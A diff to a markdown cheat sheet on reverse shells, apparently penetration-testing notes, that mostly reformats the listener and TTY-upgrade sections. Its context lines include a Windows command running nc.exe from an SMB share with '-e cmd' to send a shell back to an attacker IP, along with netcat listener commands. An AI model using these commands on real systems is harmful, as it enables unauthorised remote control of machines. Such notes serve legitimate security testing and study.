@@ -1,7 +1,5 @@
 # Reverse Shells
 
-A **reverse shell** is an attack where a compromised machine connects back to an attacker's machine, allowing the attacker to remotely control the target system and execute commands.
-
 ## Reverse Shells
 
 ### Reverse Shell Generator
@@ -94,10 +92,14 @@ And while running the smb server, execute this on the target:
 \\<ip>\smbShare\nc.exe -e cmd <ip> <port>
 ```
 
-## Interactive TTYs
+## Interactive TTY
 
 {% hint style="info" %}
-It is also possible to use `rlwrap` when starting your listening socket. (e.g. `rlwrap nc -nlvp 443`)
+It is also possible to use `rlwrap` when starting your listening socket:
+
+```bash
+rlwrap -cAr nc -nlvp <port>
+```
 {% endhint %}
 
 ```bash
@@ -118,6 +120,5 @@ stty raw -echo; fg
 reset xterm
 export TERM=xterm
 export SHELL=bash
-# Check size in another window: stty size
-stty rows <rows> columns <cols>
+stty rows <rows> columns <cols>  # Check size in another window -> stty size
 ```
